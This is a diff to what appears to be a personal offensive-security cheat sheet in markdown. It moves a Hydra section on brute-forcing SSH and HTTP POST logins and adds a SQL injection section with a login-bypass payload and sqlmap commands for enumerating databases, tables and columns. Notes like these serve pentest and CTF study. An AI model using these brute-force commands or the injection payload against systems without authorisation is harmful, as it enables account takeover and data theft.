@@ -39,6 +39,31 @@ Useful nmap scripts:
 
 </details>
 
+# Brute-force
+<details>
+<summary>Hydra</summary>
+
+```sudo hydra -l <username> -P <wordlist> [URL] ssh``` - Basic Hydra command for brute-forcing ssh password. Works similarly with other protocols such as FTP.
+
+```sudo hydra -l <username> -P <wordlist> [base_URL] http-post-form "<path>:<login_credentials>:<invalid_response>"``` - Hydra command for HTTP POST form. Path need to be specified seperately from base URL.
+
+</details>
+
+# SQL Injection
+
+```blah' or 1=1 --``` - Basic login bypass payload.
+
+<details>
+<summary>sqlmap</summary>
+
+```sudo sqlmap -u “[URL]” --cookie="[cookie_value]" --dbs``` - Initial command to enumerate databases (--dbs). Add cookie values if necessary (--cookie).
+
+```sudo sqlmap -u “[URL]” -D [database_name] --tables``` - Enumerate tables in the specified database (--tables).
+
+```sqlmap -u “[URL]” -D [database_name] -T [table_name] --columns``` - Enumerate columns in the specified table (--columns).
+
+</details>
+
 # Android hacking
 <details>
 <summary>ADB</summary>
@@ -54,16 +79,6 @@ Package names can be viewed via Google Play store. For example: https://play.goo
 Package name in this case is "com.swapcard.apps.android.backhat"
 
 ![image](https://github.com/MaxLazerhawk/OffSec-Notes/assets/53828427/31e2fce7-9d1e-4b85-9ae3-49e13fc81c48)
-
-</details>
-
-# Brute-force
-<details>
-<summary>Hydra</summary>
-
-```sudo hydra -l <username> -P <wordlist> [URL] ssh``` - Basic Hydra command for brute-forcing ssh password. Works similarly with other protocols such as FTP.
-
-```sudo hydra -l <username> -P <wordlist> [base_URL] http-post-form "<path>:<login_credentials>:<invalid_response>"``` - Hydra command for HTTP POST form. Path need to be specified seperately from base URL.
 
 </details>
 
